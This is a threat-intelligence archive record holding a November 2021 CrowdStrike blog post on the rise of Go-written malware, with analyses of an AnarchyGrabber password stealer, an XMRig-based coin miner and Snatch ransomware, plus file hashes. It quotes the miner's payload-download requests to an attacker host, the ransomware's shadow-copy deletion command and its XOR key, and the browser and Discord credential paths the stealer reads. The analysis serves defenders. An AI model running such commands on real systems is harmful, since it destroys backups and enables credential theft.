{
    "id": "2f5d9d60-47f0-4407-a572-2bf3ff4cef70",
    "created_at": "2023-01-12T15:10:23.919209Z",
    "updated_at": "2025-03-27T02:09:48.532799Z",
    "deleted_at": null,
    "sha1_hash": "566f46334d01313292a839f2539cf211030e0624",
    "title": "2021-11-12 - Golang Malware Is More than a Fad- Financial Motivation Drives Adoption",
    "authors": "",
    "file_creation_date": "2022-05-28T15:46:43Z",
    "file_modification_date": "2022-05-28T15:46:43Z",
    "file_size": 1115796,
    "plain_text": "# Financial Motivation Drives Golang Malware Adoption\n\n**[crowdstrike.com/blog/financial-motivation-drives-golang-malware-adoption/](https://www.crowdstrike.com/blog/financial-motivation-drives-golang-malware-adoption/)**\n\nAnmol Maurya November 12, 2021\n\nGolang malware popularity snowballs, increasing by 80% from June to August 2021\neCrime turns to Golang because of its versatility, enabling cross-compiling for other operating\nsystems\nCryptocurrency miners earn the largest share of total Golang malware — 70% in August\ncompared to 54% in June 2021\n\nCrowdStrike researchers uncovered an 80% increase in Golang (Go)-written malware samples from\nJune to August 2021, according to CrowdStrike threat telemetry. In terms of malware type, first\nplace goes to coin miners, accounting for 70% of the malware spectrum in August 2021. Golang’s\nversatility in enabling the same codebase to be compiled for all major operating systems, coupled\nwith the financial incentive offered by coin miners, could be one of the driving factors behind the\nrecent wave of Go-written malware. However, we will likely see more Go-based malware as it is\nbecoming more popular with developers.\n\nGolang’s versatility has turned it into a one-stop shop for financially motivated eCrime developers.\nInstead of rewriting malware for Windows, macOS and Linux, eCriminals can use Golang to crosscompile the same codebase with ease, allowing them to target multiple platforms effortlessly. Other\n\n\n-----\n\napplications for Golang involve using it as a wrapper for various eCrime malware, such as\n[ransomware. Some ransomware variants turned to Golang wrappers to make analysis more difficult](https://www.crowdstrike.com/blog/new-ransomware-variant-uses-golang-packer/)\nfor security research.\n\nBesides coin miners, password-stealing trojans and downloaders developed in Golang are also\npopular. These can potentially be handy to the eCrime community, especially access brokers, as\nthey can serve as initial access and information harvesting tools into targeted systems and\ninfrastructure. Whether Go-written malware is used to generate profit from victims by exploiting their\ncomputing power, or used as a tool to collect and potentially sell sensitive data and access into\ncompromised infrastructures, financial motivation fuels eCrime adoption of Go-powered threats.\n\nFigure 1. Daily Golang-written malware evolution (June-August 2021) (Click to enlarge)\n\neCrime dominates the threat landscape, making up 79% of interactive intrusion activity, according to\nthe recent [CrowdStrike 2021 Threat Hunting Report. However, most Go-written malware seems](https://www.crowdstrike.com/resources/reports/threat-hunting-report-2021/)\nfocused on generating revenue by exploiting the computing power of their victims and mining for\ncryptocurrency. Coin miners accounted for 54% of all Go-written malware in June 2021, 62% in July\nand 70% in August, according to CrowdStrike threat telemetry.\n\n\n-----\n\nFigure 2. Golang-written malware distribution in June, July and August 2021\n\nWhile 91% of identified Golang malware samples are compiled to target the Windows operating\nsystems, 8% are compiled for macOS and 1% for Linux. Golang allows developers to use the same\ncodebase and compile their code for Windows, Linux and macOS, but eCrime developers are likely\ntargeting Windows more because of potential market share. Some of the more exotic malware\nfamilies that we’ve identified as using Go revolve around ransomware such as GoGoogle\nransomware, Ekans ransomware, eCh0raix ransomware and Snatch ransomware, as well as\nremote access trojans (RATs), such as CYBORG SPIDER’s Pysa Golang RAT.\n\n\n-----\n\nFigure 3. File type distribution of Golang malware (June-August 2021)\n\nUnusually, we did find instances where it’s not immediately apparent which cryptocurrency some\ncoin miners are attempting to mine. While most coin miners are usually XMRig wrappers,\ndevelopers likely wanted to give themselves the option of mining for any cryptocurrency that’s\nappealing at the time of infection.\n\n## Why Stay When You Can GO?\n\nOne reason malware developers may not stay faithful to traditional programming languages — such\nas C++ or Python — and choose to go with Go could be because Go performs 40 times faster than\noptimized Python code, according to benchmarking tests. Also, a single codebase can be compiled\ninto all major operating systems.\n\nConsequently, when analyzing Go-written malware, we generally need to focus on “main” functions.\nHowever, because of the large size of the samples, there’s also the added burden of going through\nmany functions, unlike C/C++ where we usually find fewer. When Go compiles an executable, it also\nincludes Go standard symbols in the binary, which can substantially increase the size of an\nexecutable. Golang binaries include a .gopclntab structure, which maps the symbol name and its\ncorresponding offset. The structure also contains symbol names of functions created by the\ndeveloper, prefixed with the string “main,” which is why we generally focus on “main” functions.\n\n[Adding obfuscation on top of all of this, using open-source tools such as “gobfuscate” — which allow](https://github.com/unixpickle/gobfuscate)\nmalware developers to compile Go binaries from obfuscated source code — can significantly\nhamper reverse engineering efforts in terms of deciphering the malicious binary.\n\n\n-----\n\nLooking at threat telemetry from June to August 2021, three different Go-written malware samples\nwere analyzed as case studies to identify some of the Golang-based malware’s capabilities.\n\nNext is a summary analysis of three different types of malware built using Golang.\n\n## GO-written AnarchyGrabber Password Stealer\n\nA new Go-written AnarchyGrabber password stealer variant was spotted on Sept. 1, 2021, packing\nmany of the same features of its C++ counterpart. The analyzed sample (SHA256 hash\n```\n86dda1e904475fdf187af0cb13c0b67951e95230ed2bc6a3ac79c292606fda8e ) behaves in much\n\n```\nthe same way, stealing the victim’s Discord user token and using the platform to spread additional\nmalware using the victim’s friends list.\n\nAnarchyGrabber can steal passwords and usernames from Google Chrome/Brave and tokenlog the\nuser’s Discord account, as shown in Table 1 below. It will then use a webhook to broadcast the\nvictim’s passwords and user profiles from browsers, email address, login name, user token,\npasswords and IP address to a Discord channel operated by the threat actor. Using Discord as a C2\nserver for both exfiltrating data and accepting commands is not uncommon, and the Go-written\nvariant of AnarchyGrabber perfectly emulates the C++ behavior of its C++ version.\n\nmain.grab_discord \\AppData\\Roaming\\Discord\\Local Storage\\\n\nmain.grab_discord_canary \\\\Discordcanary\\\\Local Storage\\\\\n\nmain.grab_discord_ptb \\\\discordptb\\\\Local Storage\\\\\n\nmain.grab_google_chrome \\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login\n\nmain.grab_opera \\Opera Software\\Opera Stable\\Local Storage\\\n\nmain.grab_brave \\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\\n\nmain.grab_yandex \\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\\n\nTable 1. AnarchyGrabber main functions\n\nThe developers behind this implementation of AnarchyGrabber seem to use some open-source\n[tools for interacting with Discord webhooks or parsing](http://github.com/Karitham/webhook) [snowflakes, which are uniquely identifiable](http://github.com/andersfylling/snowflake)\ndescriptors for resources that contain a timestamp, such as accounts, messages, channels and\nservers.\n\nThe [CrowdStrike Falcon® platform detects and protects against this type of Go-written malware](https://www.crowdstrike.com/endpoint-security-products/falcon-platform/)\nusing the power of the cloud, on-sensor and in-the-cloud machine learning, and indicators of attack\n(IOAs) to detect the threat. As the screenshot below illustrates, we detect this sample with our\ncloud-based machine learning, and it is immediately blocked.\n\n\n-----\n\nFigure 4. CrowdStrike Falcon detection and protection for AnarchyGrabber (Click to enlarge)\n\n## GO(ing) for Crypto Mining\n\nThe spike in Go-written cryptominers is fueled in part by its adaptability. Malware authors either\ncreate custom miners or build wrappers for existing miners like XMRig. While creating wrappers is\nnot new, it presents malware developers with the added benefit of allowing them to switch mining\nbetween various cryptocurrencies. Depending on which cryptocurrency is more popular or the\nvictim’s computing power, threat actors can change which cryptocurrency they want to mine.\n\nAn example of a recent sample written in Go (SHA256 hash\n```\n995d7903e138b3f5aa318d44e959d215c6b28ea491f519af34c8bdad9a0ebda6 ) is also a XMRig\n\n```\nwrapper compiled for Windows and uses a couple of interesting techniques that are unusual from\nother coin miners. Among its more novel features is killing processes that consume too much CPU.\nIts developers likely want to boost the cryptomining process by killing processes that are not critical,\nfully utilizing the victim’s computing power for financial gains.\n\nAdditional features include checking if the malware is already present on the victim’s machine, if\nthere’s an instance of the process already running, and downloading other files from an attackercontrolled C2 server.\n\nmain.FileExists Checking the existence of file using OS.Stat\n\nmain.writetofile Writing to file using ioutil.WriteFile\n\nmain.isrunning Checking the status of Process using:\n\n1)github_com_mitchellh_go_ps_procCreateToolhelp32Snapshot\n\n2)github_com_mitchellh_go_ps_procProcess32First\n\nmain.killprocess For killing the process the attacker is using taskkill\n\n\n-----\n\nmain.DownloadFile GETs Files from webserver\n```\n             “GET /d/windowsupdatev1.json HTTP/1.1\n             Host: m[.]windowsupdatesupport[.]org\n             User-Agent: Go-http-client/1.1\n             Accept-Encoding: gzip”\n             “GET /d/inj.exe HTTP/1.1\n             Host: m[.]windowsupdatesupport[.]org\n             User-Agent: Go-http-client/1.1\n             Accept-Encoding: gzip”\n             “GET /d/runtime.dll HTTP/1.1\n             Host: m[.]windowsupdatesupport[.]org\n             User-Agent: Go-http-client/1.1\n             Accept-Encoding: gzip”\n             “GET /d/autoupdate.exe HTTP/1.1\n             Host: m[.]windowsupdatesupport[.]org\n             User-Agent: Go-http-client/1.1\n             Accept-Encoding: gzip”\n             “GET /d/updater.exe HTTP/1.1\n             Host: m[.]windowsupdatesupport[.]org\n             User-Agent: Go-http-client/1.1\n             Accept-Encoding: gzip”\n             “GET /d/procdump.exe HTTP/1.1\n             Host: m[.]windowsupdatesupport[.]org\n             User-Agent: Go-http-client/1.1\n             Accept-Encoding: gzip”\n             “GET /d/service.exe HTTP/1.1\n             Host: m[.]windowsupdatesupport[.]org\n             User-Agent: Go-http-client/1.1\n             Accept-Encoding: gzip”\n\n```\nmain.getcpuusage Using PS command to sort output based on RAM usage:\n\n“ps -eo pid,ppid,cmd,%mem,%cpu –sort=-%mem | head -n 2 | tail -n “\n\nIt will use to kill processes that are utilizing RAM too much\n\nTable 2. Coin miner main functions\n\nUpon execution, this Go-written coin miner downloads the `Runtime.dll file containing the debug`\npath (“ C:\\Users\\admin\\Desktop\\toolchain\\deamon\\hide_proc_research\\Hide-Me-From```\nTask-Manager-master\\HookerDLLBuild\\bin\\x64\\Release\\HookerDLL.pdb ”). It also downloads\n\n```\n[an open-source command-line utility (Inj.exe) that actors potentially use to inject and eject DLLs,](https://github.com/nefarius/Injector)\nincluding Runtime.dll. It also uses Procdump.exe (a command was run that is associated with\ndumping LSASS process memory).\n\nAmong other features, its developers also included checking the version of the downloaded files to\npotentially update them should new releases be available and running daily scheduled tasks with\nthe sample to ensure persistence on the compromised machine.\n\nThe Falcon platform also detects this particular Go-written coin miner using machine learning and\n[IOAs. As shown in Figure 5, our machine learning can block at the initial stage of an attack and](https://www.crowdstrike.com/cybersecurity-101/indicators-of-compromise/ioa-vs-ioc/)\nuses IOAs triggered by various tactics and techniques.\n\n\n-----\n\nFigure 5. CrowdStrike Falcon uses machine learning and IOAs of the tactics and techniques of the Golang-written\n\ncoin miner (Click to enlarge)\n\n## GO Snatch, Go!\n\nSnatch ransomware has been around since 2018, especially featuring multiple 32-bit or 64-bit\nimplementations written in Golang. This is a perfect example of Golang being more than just a fad,\nbut an actual “go-to” programming language that malware developers actively use. In fact, our own\ntelemetry from June to August 2021 shows that Go-written malware accounted for 7% of all\nsamples.\n\nAfter making its debut around late 2018, Snatch ransomware has been on and off the radar of\nsecurity companies and researchers ever since. It has constantly been updated and improved with\nnew anti-forensic features and various capabilities, as with any ransomware family.\n\nAnalyzing one of the more recent Snatch ransomware samples that’s compiled explicitly for\n[Windows ( e4b2d60cea9c09a7871d0f94fe9ca38010ef8e552f67e7cdec7489d2a1818354 ), not](https://www.hybrid-analysis.com/sample/e4b2d60cea9c09a7871d0f94fe9ca38010ef8e552f67e7cdec7489d2a1818354/61514dfc803ca606a977ece2)\nmuch has changed in terms of how previous researchers described the inner workings of\nransomware. It uses the “ujvxadjxkoz” file extension for encrypted files. It places a “HOW TO\nRESTORE YOUR FILES.TXT” file in all the compromised folders. It continues to rely on the Golang\n[openpgp package for operations on OpenPGP messages.](https://pkg.go.dev/golang.org/x/crypto/openpgp)\n\nHowever, among some of the changes implemented by this particular Snatch ransomware sample\ninvolve making changes to the exclusion list for encrypting various directories:\n```\nProgram Files, ProgramData, Default User, recovery, $recycle.bin, perflogs,\ncommon files, dvd maker, msbuild, microsoft games, mozilla firefox, tap-windows,\nwindows defender, windows journal, windows mail, windows nt, windows sidebar,\nmicrosoft.net, microsoft, start menu, templates, favorites\n\n```\n\n-----\n\nAs seen in Figure 6, Snatch ransomware starts by initializing the main structures necessary for\nGolang malware execution and then uses the main_decodeString function to pass encrypted data\nfirst encoded with Base64, then uses XOR encryption using the key\n“mjkHreiUxqcTSyhWnbDXYuE.”\n\nFigure 6. Snatch ransomware main_init functions\n\nThe `main_makeBatFile creates a` `.bat file using` `main_randomBatFileName containing the`\nqueries “ SC QUERY | FINDSTR SERVICE_NAME ” and “ vssadmin delete shadows /all\n\n`/quiet ”. In this case, it creates a file with the` `nceirbfjdgljlw.bat` filename.\n\nIn terms of persistence, Snatch ransomware uses the `main_runService function to run Service`\nusing the [SVC Golang package. Finally, the](http://golang.org/x/sys/windows/svc) `main_encrypt function is responsible for triggering`\nthe encryption process, at the end of which it places a ransom note in every encrypted folder on the\nvictim’s system.\n\n\n-----\n\nThe ransom note provides two email addresses for contacting the ransomware operator to negotiate\nthe ransom demand and potentially recover the encryption key.\n\nFigure 7. Ransom note for Snatch ransomware (Click to enlarge)\n\nThe Falcon platform detects and protects against this type of Golang-written malware using the\npower of the cloud, on-sensor and in-the-cloud machine learning, and IOAs to detect the threat. As\nthe screenshot below illustrates, we detect this sample with our cloud-based machine learning, and\nit is immediately blocked.\n\nFigure 8. CrowdStrike Falcon using machine learning for detecting and preventing Snatch ransomware (Click to\n\nenlarge)\n\n_Note: More detailed intelligence and technical information about Snatch ransomware is available to_\n_CrowdStrike customers through the Falcon console._\n\n\n-----\n\n## Golang Is Here to Stay\n\nGolang-written malware is not a fad and will not go away at any time soon. If anything, we are\nseeing an increase in Golang being used by malware developers and adversaries. This is likely in\nstep with how we see Go being adopted by the general programming community as features and\ncapabilities have improved.\n\nGolang has proven to be a sufficiently versatile programming language that can accommodate any\nmalware, although coin miners currently seem to pique the interest of developers.\n\nCrowdStrike will continue to monitor the evolution of the malware threat landscape and use the\npower of machine learning and IOAs to detect and protect endpoints from new and unknown\nmalware.\n\n## Indicators of Compromise (IOCs)\n\n**File** **SHA256**\n```\n AnarchyGrabber 86dda1e904475fdf187af0cb13c0b67951e95230ed2bc6a3ac79c292606fda8e\n Coin Miner 995d7903e138b3f5aa318d44e959d215c6b28ea491f519af34c8bdad9a0ebda6\n Snatch e4b2d60cea9c09a7871d0f94fe9ca38010ef8e552f67e7cdec7489d2a1818354\n Ransomware\n Runtime.dll 5b3fc771f43d8e67bd8957f7b3d9a49eae80b88e43c13cbf16623623e9028375\n Inj.exe cc432ca276209849b1e4e36553d12aa87fd4cf1ba2609032986bf82943994774\n Procdump.exe c073d88d4240fbd6b7183b126eb0f3617bad8944d7cf924982e2b814170a614f\n\n```\n**Additional Resources**\n\n_[Visit the product website to learn how the powerful CrowdStrike Falcon platform provides](https://www.crowdstrike.com/endpoint-security-products/falcon-platform/)_\n_comprehensive protection across your organization, workers and data, wherever they are_\n_located._\n_[Get a full-featured free trial of CrowdStrike Falcon Prevent™ and see how true next-gen AV](https://www.crowdstrike.com/resources/free-trials/try-falcon-prevent/)_\n_performs against today’s most sophisticated threats._\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-12 - Golang Malware Is More than a Fad- Financial Motivation Drives Adoption.pdf"
    ],
    "report_names": [
        "2021-11-12 - Golang Malware Is More than a Fad- Financial Motivation Drives Adoption.pdf"
    ],
    "threat_actors": [
        {
            "id": "5bc2bb61-9b32-496f-b54b-61cf3d01969f",
            "created_at": "2023-01-06T13:46:39.246266Z",
            "updated_at": "2025-03-27T02:00:03.030403Z",
            "deleted_at": null,
            "main_name": "GOLD BURLAP",
            "aliases": [
                "CYBORG SPIDER"
            ],
            "source_name": "MISPGALAXY:GOLD BURLAP",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536223,
    "ts_updated_at": 1743041388,
    "ts_creation_date": 1653752803,
    "ts_modification_date": 1653752803,
    "files": {
        "pdf": "https://archive.orkl.eu/566f46334d01313292a839f2539cf211030e0624.pdf",
        "text": "https://archive.orkl.eu/566f46334d01313292a839f2539cf211030e0624.txt",
        "img": "https://archive.orkl.eu/566f46334d01313292a839f2539cf211030e0624.jpg"
    }
}